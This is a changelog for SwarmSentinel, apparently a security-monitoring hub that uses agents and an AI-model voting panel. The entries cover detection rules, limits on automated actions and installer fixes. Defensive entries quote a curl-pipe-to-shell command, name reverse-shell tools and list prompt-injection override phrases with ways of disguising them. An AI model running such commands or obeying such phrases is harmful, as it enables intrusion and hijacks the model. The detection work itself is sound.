# Changelog

## 2026-11-18 (v0.1.11): the Windows installer never restarts a PC on its own

- `install-windows.ps1` no longer turns on WSL2 by itself. Installing WSL2 turns on Windows features (WSL, Virtual Machine
  Platform) and Windows must restart, which on some PCs is slow, asks for the BitLocker recovery key or fails to start.
  It now stops, says why, and changes nothing unless it is run with `-AllowRestart`. `-CheckOnly` warns about the restart.
- If the PC already has an Ubuntu under another name (for example `Ubuntu`), it says so: `-Distro <name>` uses it with no
  restart.
- To update an install that already runs inside WSL, use `deploy/update.sh` inside Ubuntu; it never touches Windows.

## 2026-11-18 (v0.1.10): accurate dashboard numbers, Gmail extension, Week 3 quality fixes

### Dashboard numbers
- The tiles (Critical, High, Medium, Low, Total, AI Analyzed) show the hub's real totals. They counted the downloaded list,
  which holds only the newest 300 findings, so Total and AI Analyzed stopped at 300 (one hub: 5,684 stored, all analyzed).
- **Every open finding is sent to the page**, not only the newest 300: open findings older than that were never shown, so the
  dashboard could say "All clear" with open findings in the database (one hub had 16 from May). "Total" is now "Total stored".
- Settings, Add a machine: a new code is shown in three separate blocks with Copy buttons: **browser extension** (hub
  address and code only), Linux computer, Windows PC. People were pasting the Linux install command into the extension.

### Gmail extension (SwarmSentinel Shield 1.1.0)
- The scanner reads each **opened** message and the real link behind every link (including Gmail's google.com/url rewrites).
  It used to look for the text inside Gmail's subject heading and could skip every message.
- New signals: link text that shows another site, a sender name claiming a brand from another domain, look-alike (punycode)
  links, Gmail's Spam folder. It looks only right after the person acts (opens, clicks, presses a key).
- **A message Gmail already put in Spam** is one low record stored as **resolved** ("already handled by Gmail's spam
  filter"): no alert, no AI vote. Hub side: `HANDLED_ELSEWHERE` in `routes/threats.py`, exact (type, handled_by) pairs only.
- **A click on a link inside a risky message** (warning signs, or in Spam) is `phishing-link-clicked`, high, open. A click in
  an ordinary message is never reported. Reports without a link host are grouped by their signals, not all merged into one.

### Week 3 quality fixes
- Preflight logs in to Pi-hole instead of only checking that its settings exist.
- A block that fails to undo 3 times in a row raises one alert (automatic responses and the approval queue).
- Stored verdicts record each vote's model family, judged by this hub's own model list; incident reports show them.
- Audit O-1: an Ollama server is never guessed at the router's address unless `SSAI_OLLAMA_DISCOVER=1`.
- Personal data is masked for cloud models and the public ledger: card numbers (Luhn), US Social Security numbers, phone
  numbers.
- `docs/code-map.md` lists the modules added since 15 November.

## 2026-11-18 (v0.1.10): detection gaps from the beta record

The open problems listed in the 15 November beta-test record (Part C), except those already fixed (pause logged "failed",
firewall warning, IPv6 attackers). Detection only: no new automatic action, and the three new finding types are never acted
on automatically.

- **Start-up locations are watched** (`persistence-change`): files added, changed or removed in sudoers.d, pam.d, cron
  (crontab, cron.d, cron.hourly/daily/weekly/monthly, users' crontabs), /etc/systemd/system (enabled units included), profile.d,
  update-motd.d, /etc/profile, bash.bashrc, environment, rc.local, and a new /etc/ld.so.preload; in /root and each person's home
  folder, authorized_keys (high), autostart and user systemd units, and shell start-up files (low: people edit their own).
  A location seen for the first time is recorded silently. A change made during a package install to a file that package owns
  is logged, not reported; never for ld.so.preload, crontabs or login keys. The install is matched on the file's change time
  (ctime), because dpkg keeps the archive's months-old modification time. The baseline file keeps the new state.
- **SSH log:** failures by any method are counted (publickey, keyboard-interactive, none, hostbased), and so are connections
  that gave up or hit the attempt limit before logging in (`Connection closed by authenticating user ... [preauth]`,
  `maximum authentication attempts exceeded`), once per connection, so a key-only attacker is no longer invisible and a
  password attempt is not counted twice. Unchanged: an unknown user name still counts twice.
  One reader (`agent_util.ssh_failure`) serves the agent and the direct checks, so a brute-force finding raised from key or
  gave-up lines is confirmed by the direct check too. The address is always the last `<address> port <n>` sshd wrote, so a
  user name with spaces, a fake address or the words "Failed password" cannot plant an address or hide a failure.
  Only password guesses count toward "a login after failures" (critical): an admin whose key agent offers several keys is
  not told their password was guessed.
- **sudo** (`sudo-failure`, medium): 3 wrong sudo passwords for one account within an hour, or an account not allowed to use
  sudo trying it. Once per account per hour. Read only from sudo's own lines (program name in the syslog position), so an
  sshd line cannot forge one.
- **No false "distributed" alarm from one loud attacker:** the distributed rules now count only when no single address made
  more than half the failures in the window. That address still gets its own brute-force alarm.
- **Very slow guessing** (`slow-brute-force`, medium): 6 failures from one outside address on 3 or more different days within
  14 days, which never reach 5 inside 48 hours. Once per address; addresses inside the network are left out. This memory is
  saved (state store) after each read of auth.log, so a restart does not reset it.
- **Hidden-folder rule:** a program started by a relative name (`./.x/run` from inside /tmp) or a relative script given to a
  shell or interpreter is now matched through `/proc/<pid>/exe` and the process's working folder.
- **Injection scanner:** Unicode tag characters (invisible text some models read) are decoded and flagged as hidden;
  invisible operators too. Hidden characters and soft hyphens are removed before matching (`i<zero-width>gnore`); a soft
  hyphen alone is not flagged (ordinary HTML mail has them). Base32, ROT47 and text encoded twice (base64 of base64) are
  decoded, and base64 right after `=` (`payload=...`) is now decoded too (it was skipped before). Japanese, Korean and Arabic rules, and common paraphrases ("pay no
  attention to the previous instructions", "from now on you will"). A paraphrase in new words can still get past a pattern.
- Dashboard labels and "What this could be?" help for the three new finding types.
- Still open from that list: item 7 (shell and miner command lines the record does not name).

## 2026-11-18 (v0.1.9)

### IPv6 everywhere an address is read
- One address reader for every agent (`agents/agent_util.py`: `find_ip`, `find_ip_port`, `ssh_source`, `split_host_port`,
  `normalise_ip`): IPv4 and IPv6, bracketed (`[2001:db8::5]:22`), with a zone (`fe80::1%eth0`) or IPv4-mapped
  (`::ffff:203.0.113.5` counts as `203.0.113.5`). Times, MAC addresses and version strings are never taken for addresses.
- **SSH log:** every IPv6 attacker used to be counted as one address called "unknown" (no per-address alarm, no
  "login after failures", a false "brute force from unknown"). Each address now counts on its own, and the address is taken
  from sshd's own `from <address> port <n>` at the end of the line, not from a user name the attacker chose.
  Unchanged on purpose: one guess at a user name that does not exist still counts twice ("Invalid user" + "Failed password").
- **Blocking:** `[2001:db8::5]:4444` is now understood. An IPv6 firewall block is inserted above the first IPv6 rule (ufw keeps
  two lists and refuses an IPv6 rule at an IPv4 rule's number); before, it was appended below the IPv6 allow rules, where it did
  nothing for ports like SSH. If IPv6 is switched off in ufw, the error says how to switch it on.
- **Inside the network** now includes IPv6 loopback, unique-local (`fd..`) and link-local (`fe80::`), plus 169.254/16 and
  100.64/10 (Tailscale): such peers are no longer treated as the internet, and they are masked on the dashboard and by the Windows
  agent (`fd12:3456:xxxx::`). A masked IPv6 address is never blocked.
- **Firewall log:** IPv6 UFW BLOCK lines are read. Inbound is also recognised from `IN=eth0 OUT=` (a packet to this host),
  because IPv6 has no NAT and its destination is rarely a private address.
- **Outbound connections, direct checks, threat feeds, process rules:** IPv6 peers are checked against the C2 port list and the
  feeds; the direct checks confirm IPv6 connections, failed logins and feed listings (so automatic response can act on them, with
  every limit unchanged); `curl http://[2001:db8::5]/x.sh | sh` and openssl shells to an IPv6 address are caught.
- **Dashboard:** the Block button and "What this could be?" commands accept IPv6; the MASKED tag recognises masked IPv6.
- Stays IPv4 on purpose: the network scan (an IPv6 home network has too many addresses to scan) and `set-network.sh`.
- Windows agent 0.2.2 (IPv6 masking). Tests: new `tools/test_ipv6.py` (documentation addresses only).

### Action-risk policy: what SSAI may do on its own, by severity (Week 2)
- One policy (`backend/action_risk.py`) for both automatic paths. When a finding **arrives**, only **low** findings may be acted on.
  **Medium** findings wait for the AI panel's verdict and are acted on only with **full consensus**: at least two **different model
  families** voted malicious (looked up from this hub's own model list, never from the verdict; two models of the same family count
  once; unknown or switched-off models do not count), confidence of at least 90 by default, and nothing disputes it. A direct check of
  the machine must still confirm it. **High** and **critical** always go to a person.
- What this means today: the detectors label brute force and feed hits **medium** and miners/reverse shells **high**, so nothing is
  acted on when it first arrives any more; medium findings can be acted on after the vote (when automatic response is switched on).
- **Agreement standard:** the administrator can raise the number of model families and the confidence; SSAI enforces floors of 2
  families and confidence 80.
- **`allow_severe` removed** from the permissions to act without asking: a permission covers low and medium only, and medium needs
  full consensus. Permissions stored before this change are refused for high and critical too.

### Consensus-gated pause (owner decision, 16 November 2026)
- A **high or critical** miner or reverse shell may be **paused** (never killed, never a block) without waiting for a person, when the
  agreement standard is met and a direct check confirms the same program is still running. **Off by default**; it can only be switched
  on after a test alert has been sent and acknowledged. The never-pause list, system accounts and SSAI itself are still never paused.
- **A paused program stays paused** (for every pause, not only these) until a person chooses Undo (resume), End program or the new
  **Keep paused**. The time limit no longer resumes a pause, so an attacker is never let back in by a timer. Blocks still end at their
  time limit.

### Alerts
- Every live automatic action and every consensus-gated pause raises an **alert**. First channel: the dashboard (a red bar until a
  person acknowledges it; Settings > Automatic response > Alerts). A channel counts as working only after a person acknowledges a
  test alert. Alerts carry the finding number and the program name, never a command line or an action link.

### Fixes
- **An unknown severity now becomes medium, not low**, when a finding is submitted (low is the only severity acted on
  when a finding arrives). A permission's automatic approval now raises an alert too, and the verdict path never blocks a
  target a permission already approved.
- **Pause logged "failed" although the process stopped** (15 Nov Part C): if the pause call reports an error but the same program is
  now stopped, it is recorded as paused, so Undo works. The original cause could not be reproduced on this build; this closes the
  effect.
- **Firewall preflight:** Settings warns when ufw is off or Pi-hole is not configured, because a block would then fail.
- **GitHub panel stood still since 4 November** ("last push 334 h ago", 0 committed): every finding since then was a repeat of a known
  threat, which the ledger never published, and the committed count was database rows minus a baseline that the clean-up job had
  pushed below zero. The ledger now publishes repeat sightings (at most hourly), the panel counts the published ledger, lists the
  newest ledger commits and says when the reporter last checked.

## 2026-11-17 (v0.1.9)

### Break-glass: one switch that stops every automatic action
- New **Stop all automatic actions now** button at the top of Settings > Automatic response (also `POST /api/auto/break-glass/engage`).
  While it is on, neither the automatic responses nor the permissions to act without asking do anything; monitoring, alerts and
  everything a person does by hand carry on. Any admin may engage it (the admin key too: stopping is the safe direction);
  only a signed-in person may release it. Both are written to the audit log first.
- It turns on **by itself** when a live automatic action reaches the cap of 10 an hour, so a runaway loop stops until a person
  looks. A dry run never trips it. A state file that cannot be read counts as ON.
- **Never-pause list:** databases, the model server, sshd, systemd, Docker and containerd are never paused automatically, even if
  a finding says so (they are still reported, and a person decides). `SSAI_NEVER_PAUSE` adds names.
- `docs/audit/week1-automation-map.md`: every code path that can act, what triggers it, and what stops it.
- Tests: `tools/test_break_glass.py` (18); `tools/test_route_auth.py` lists the release route as person-only.

## 2026-11-16 (v0.1.9)

### The Settings menu is always reachable
- The gear in the far top-right corner (where screen overlays sit) is now a labeled **Settings** button that never shrinks;
  Sign out is a proper text button; narrow windows hide the clock and status labels before any button. Settings is also
  linked from the side navigation of both views. Escape closes the menu.

### Better detection (15 November fixes, rebuilt on the home build)
- **File integrity** compares SHA-256 contents: an edit with its size and time put back is a HIGH alert, `touch` or an
  identical rewrite is silent, a mode or owner change always alerts; `/etc/group` is watched. A change to passwd/group/shadow
  is skipped only with proof it is harmless (a system account that cannot log in, created during a package install or just
  after a person's sudo); new login accounts, admin-group additions, password changes and deletions always alert.
- **Sign-ins**: a login right after 5+ failures from that address is a CRITICAL "brute-force-success". Per-address counts
  forget after 48 hours. Slow, spread-out password guessing is caught (1 hour, 24 hours, and one account from 3 addresses).
- **Processes**: busybox/toybox wrappers, `--exec`, socat exec, awk `/inet/`, openssl and fifo shells, downloads from a bare
  IP that are then run, programs in hidden temp folders, miner arguments on renamed binaries, fake kernel threads, and a
  program from /tmp, /var/tmp or /dev/shm using a full core for 10+ minutes.
- **Ports**: mining-pool ports count as "phoning home"; a port open only to this machine is reported only when its owner is
  odd (nc, a shell, a program in a temp folder).

### Look again before acting
- Before anything acts on its own, SSAI checks the machine itself at that moment (process still running with the same
  command line, port still open, connection still there, failed logins in auth.log, feed still lists it). Anything but
  "confirmed" means a person decides. The result is shown on the verdict ("not confirmed by a direct check").

### Automatic response (off, and dry run, until you change it)
- Settings, **Automatic response**: block an attacking address (20+ failed logins), block a feed-listed address or website,
  pause (not kill) a miner or reverse shell owned by a person's account. Dry run first writes what it *would* have done.
  Only a signed-in person changes it, presses Undo or End program. Audit line before every action, at most 10 automatic
  actions an hour (shared with autonomy grants), every block and pause ends after its time limit (default 24 h).

### Dashboard
- The IOC / Origin column shows a device name (Pi-hole, reverse DNS or the network card's maker). A **MASKED** tag opens
  what is known about a hidden LAN address. Every row has **What this could be?**: likely causes, how to tell, how to fix.

### Hardening and memory
- The prompt-injection scanner sees through accents, look-alike letters, leetspeak, spacing, reversal, ROT13 and base64/hex/
  URL/HTML/\u encodings, and knows French, Spanish, German, Italian, Portuguese, Russian and Chinese. New flag
  "obfuscated-text". Input capped at 20,000 characters.
- Local AI models leave memory right after answering (`SSAI_OLLAMA_KEEP_ALIVE`, default 0). The dashboard service runs one
  worker with 8 threads (new installs; an existing service file is changed by the operator).

### Notes
- `docs/audit/week1-audit-2026-11-16.md`: read-only audit (remediation, auto-proceed, rollback, audit trail, telemetry,
  feeds, Ollama discovery). `docs/plans/zeek-and-feeds-plan.md`: plan only.
- Tests: test_change_evidence, test_file_integrity, test_slow_bruteforce, test_live_checks, test_auto_response,
  test_injection_guard (new); several others extended. Tests no longer write to the real cloud audit log.

## 2026-11-04

### A clean install on a real VM, and what it showed
- **Private releases (optional).** If the releases repository is ever made private, an install can be given a read-only GitHub
  access token and keep working: `SSAI_UPDATE_TOKEN` for the one-line installer (the installer saves it owner-only in
  `.update-token` so `deploy/update.sh` and the Settings update check can use it), `-Token` for the Windows installer, or the new
  **Updates from a private repository** card in Settings. The token goes to `api.github.com` only, over stdin (never on a command
  line), and is never shown again. A public repository needs none and behaves exactly as before.
- Settings has a **Microsoft Copilot and Teams** card: a person adds their own Entra tenant ID, the bot's application (client) ID
  and secret, the token audience and the people who may approve blocks. The hub's values go to `.env`, the bot's to
  `copilot/.env` (owner-only), with one shared lane key made for both. Secrets are never sent back to the page. Saving restarts the
  dashboard a few seconds later so every worker reads them. Nothing contacts Microsoft until the Copilot service is started
  (`copilot/README.md`); the Teams sign-in step itself has still not been tried against a real tenant.
- A provider key that cannot be saved now says why ("Permission denied: ...") and gives the fix, instead of "Failed to write .env".
  Switching a model on that cannot answer yet (no key, or no local model server) says so and says what to do.
- The installer no longer warns "not a git checkout: deploy/update.sh cannot update this install" on an unpacked release, which
  it can update.
- A SwarmSentinel icon: a menu entry (and a Desktop icon when there is a Desktop folder) that opens the dashboard on Linux hubs
  (`--no-launcher` skips it); a "SwarmSentinel Dashboard" icon on the Desktop and in the Start menu on Windows
  (`-DesktopIcon Off`, `-StartMenu Off` skip them); the logo on `ssai-agent.exe` and as the browser tab icon. Windows will not
  let a program pin itself to Start: right-click the entry in Start and choose Pin to Start. Starting at boot already exists
  (`-AutoStart On`, services on Linux). Windows agent is now 0.2.1.

## 2026-11-03

### Windows PCs can act on findings (off by default, a person approves every action)
- The Windows agent can carry out actions a signed-in person approves on the hub: block an address (Windows Firewall), Defender
  scan / removal, stop a process, isolate the PC, block a domain (hosts file). It asks the hub every 30 s (no listening port),
  runs only a fixed list, undoes every network change after its time limit from a list on disk, and never blocks the hub, the
  gateway, DNS servers or anything inside the organisation. Enable per PC: `ssai-agent.exe response approve` (default `off`; the
  hub cannot switch it on). Hub: `NodeAction` table, `node_actions.py`, `routes/node_actions.py`. See `docs/windows-agent.md`.
  No dashboard button yet, and there is no automatic mode.
- Review fixes: isolating a PC is refused unless the agent starts at boot (only the agent can lift it); the installer and
  `ssai-agent.exe response --lift-all` undo blocks and isolation before the agent is removed or boot-start is turned off;
  the agent never blocks the hub's own name or a parent of it; queueing an action always needs a signed-in person, even when
  `SSAI_APPROVAL_REQUIRES_PERSON=0` lets the admin key approve blocks.

### Fewer agents (29 -> 20)
- Hub agents 21 -> 14: `SocketWatchAgent` replaces `PortMonitorAgent` + `NetworkConnAgent` (one `ss` pass; listeners every
  2nd cycle); `HostHealthAgent` replaces `ServiceWatchAgent` + `DiskSpaceAgent` + `FileIntegrityAgent`;
  `LocalAnalyzerAgent` replaces the Ollama, Hermes and Watchtower analyzers (same three models and severity tiers, still
  off by default). `ThreatFeedAgent` is gone (`IntelFeedAgent` already loads URLhaus into the local store) and so is
  `BrowserExtAgent`, which only sent heartbeats for the browser extension.
- Windows agent 8 -> 6 sensors: `WinSecurityAgent` is part of `WinDefenderAgent`, `WinDiskAgent` part of `WinStabilityAgent`.
- An agent whose machine has nothing for it to watch now stays off by itself and is not offered in Settings: `PiHoleAgent`
  needs `PIHOLE_IP` and `PIHOLE_PASSWORD`, `NetworkScanAgent` needs `nmap`. It starts within ~30 s once that is in place,
  and an operator's explicit switch still wins. One build therefore fits any network.
- Findings already stored keep the old `detected_by` names; new ones use the merged agent's name. The hub deletes the
  dashboard rows of retired agents when it starts (`agent_catalog.RETIRED`), so the count shows only agents that exist.
  A machine still running an old build re-registers them until it is updated.
- A switch an operator made for the Ollama, Hermes or Watchtower analyzer (on) carries over to `LocalAnalyzerAgent`.
  The three tiers now run together; they can no longer be switched separately.
- The dashboard's agent pane lists a Windows PC's sensors in their own group, "<host> (Windows)", without the `@node` suffix.
- Windows agent: `WinEventAgent` no longer reports "Windows flagged N PowerShell script(s) as suspicious" for the agent's own
  PowerShell. Loading Windows' network module (`Get-NetTCPConnection`) writes ~38 generated wrapper scripts to the PowerShell
  log at warning level, and the port sensor did that every 2 minutes. The agent now remembers the process ids it started and
  skips warnings from those; it matches on process id, not script text, so malware cannot hide by copying text.

## Unreleased (2026-11-01)

### Windows install
- `deploy/install-windows-docker.ps1`: one command sets up WSL2, Docker Engine inside Ubuntu (no Docker Desktop),
  the hub (`docker compose up -d --build`), a keep-WSL-alive task, and the native Windows agent enrolled to that hub.
  `-CheckOnly` changes nothing. Not yet run end to end on a real PC.
- `deploy/install-windows-agent.ps1`: installs `ssai-agent.exe` (checksum checked), enrolls it, locks its data folder
  and runs it as SYSTEM at boot. The Settings page and `docs/windows-agent.md` already pointed at this script; it had
  never been committed because `.gitignore` excluded every `*.ps1` (now excepted under `deploy/`).

### Windows agent
- Three new sensors: `WinDefenderAgent` (Defender detections; ransomware and attack-surface protection status),
  `WinEventAgent` (new services, accounts, Administrators-group changes, cleared logs, scheduled tasks, PowerShell
  scripts Windows flags) and `WinStabilityAgent` (blue screens, unexpected shutdowns, WHEA hardware errors, repeated
  crashes). Details in `docs/windows-agent.md`.

## Unreleased (2026-10-18)

### Pre-pilot hardening
- Threat data and the deployment's posture (ten `GET` endpoints) now need a signed-in admin, the admin key, or the
  display's read-only viewer key (`SSAI_VIEWER_KEY`, sent by the kiosk's proxy as `X-SSAI-Viewer`). Health checks use
  `/health`. Existing displays must be given the key; see `deploy/tls/README.md`.
- Single sign-on for the dashboard admin (OIDC, Entra ID by default): `SSAI_SSO_*` settings in `backend/sso.py`.
  `SSAI_SSO_ONLY=1` turns the local password off.
- Content-Security-Policy on every response; HSTS when `SSAI_HSTS=1` over real HTTPS.
- TLS reverse-proxy support: `deploy/tls/`, `deploy/check-tls.sh`, `install.sh --bind`.
- An AI provider that stops answering is logged as `DEGRADED` (rate-limited) instead of being silent.
- `docs/plans/threat-model.md`.

## Unreleased (2026-10-11)

### Packaging and deployment
- `deploy/make-release.sh` builds a downloadable `swarmsentinel-<version>.tar.gz` from any commit: no git history, no
  secrets, no lab data (`export-ignore` paths are excluded and the build refuses if an `.env`, database or key slips in).
  Install on a fresh machine: `tar xzf swarmsentinel-<version>.tar.gz && cd SwarmSentinel && sudo deploy/install.sh`.
- `deploy/install.sh` now restarts the services after installing them, so a re-run applies new code.
- `deploy/sandbox/`: a VirtualBox test VM (Ubuntu autoinstall) and setup scripts for installing a release on a clean
  machine and running live red-team drills against it.

### Governance and AI safety
- Provider approvals: a cloud AI provider only receives data after it has been explicitly approved; per-provider
  shared-responsibility notes live in `docs/third-party-ai/`.
- Agent state store (local shared state, see `docs/plans/2026-10-08-local-shared-state.md`) and decision lineage
  (each verdict records which code version and inputs produced it); the governance page can read agent state.
- `RedTeamAgent` runs adversarial self-tests every 6 hours (sanitizer, cloud gate, remediation) and reports pass/fail.
  Gaps it found in the cloud gate and remediation actions are closed.

### Detection
- Distributed SSH brute-force detection (many hosts, one target), reported as one finding per host.
- `ProcessMonitorAgent` no longer flags any `python -c` one-liner. It now matches the executable name for miners,
  `nc` only with an exec flag, `/dev/tcp` shells, and interpreter `-c`/`-e` only when the code contains reverse-shell
  primitives. This removes a class of false positives that the AI panel escalated to fabricated CRITICAL verdicts.
- Agent interval floor applies only when scaling shortens an interval.
- Tools locate their install without `DATA_DIR`.

### Fixes
- Findings from the 2026-09-30 code review fixed (see `backend/tools/test_review_fixes.py`).
- Sandbox drills: new sightings of an existing finding count as caught; drills wait for the agent runner to take its
  baselines.

### Tests
- New suites for lineage, provider approvals, red team, state store, sanitizer, sandbox, process monitor and the review
  fixes (44 test files passing at this commit).
